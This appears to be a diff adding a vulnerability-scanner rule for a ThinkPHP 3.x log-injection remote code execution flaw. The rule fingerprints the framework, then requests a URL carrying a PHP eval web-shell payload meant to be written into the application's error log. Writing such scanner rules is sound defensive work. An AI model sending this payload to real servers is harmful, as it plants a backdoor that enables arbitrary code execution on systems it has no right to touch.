@@ -1,0 +1,16 @@
+name: Thinkphp3.0-log-rce
+rules:
+  r0:
+    request:
+      method: GET
+      path: /dwaodkwpa
+    expression: response.body.bcontains(b'thinphp 3.2.')
+  r1:
+    request:
+      method: GET
+      path: /index.php?m=--><?=${@print(eval($_POST[1]))}?>
+      headers:
+        Cookie: PHPSESSID=t6drgq5cgde4caprfqv30joda0
+        DNT: 1
+    expression: response.status == 404 && response.body.bcontains(b'系统发生错误')  && response.headers["content-type"].icontains("text/html")
+expression: r0() && r1()
